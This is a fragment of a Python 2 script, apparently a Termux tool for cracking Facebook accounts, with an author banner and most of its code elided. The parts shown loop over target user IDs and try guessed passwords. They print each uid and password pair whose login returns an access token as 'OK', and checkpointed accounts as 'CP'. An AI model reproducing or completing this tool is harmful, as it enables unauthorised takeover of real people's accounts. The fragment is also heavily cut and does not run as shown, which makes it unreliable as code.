...
#Script Edited By ALI PAKHTOON

#Utf-8 python 

try:

	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uid,string
...
def logo():
    try:
        print "\n \033[1;93m"
        os.system("figlet  M u l l a h")
    except:
        os.system("pkg install figlet")
    print '''              
\n\033[0m------------------------------------------
\033[1;92m  *  Author \033[1;93m: Muhammad Ullah
\033[1;92m  *  Fb \033[1;93m: Muhammad Ullah Ahmadzai 
\033[1;92m\033[0m-------------------------------------------
'''
def ran():
    os.system("exit()")
    print "\033[1;92m   Tool Exited"
def main():
    ...
    try:
        ...
        try:
             if 'access_token' in q:
                  ...
                  sav.close()
                  menu()
             elif 'https://www.facebook.com/M.ULLAH.BAAP.KI.ID.HA.TERY' in q['error']:
                 print ''
    ...
    if select == '1':
        ...
        for t in range(id_limit):
            ...
            try:
                ...
                print '\x1b[91;1m  Invalid Link / Not Public Account '
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;32m[ALI-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;32m[ALI-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ...
                        print '\x1b[1;31m[ALI-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
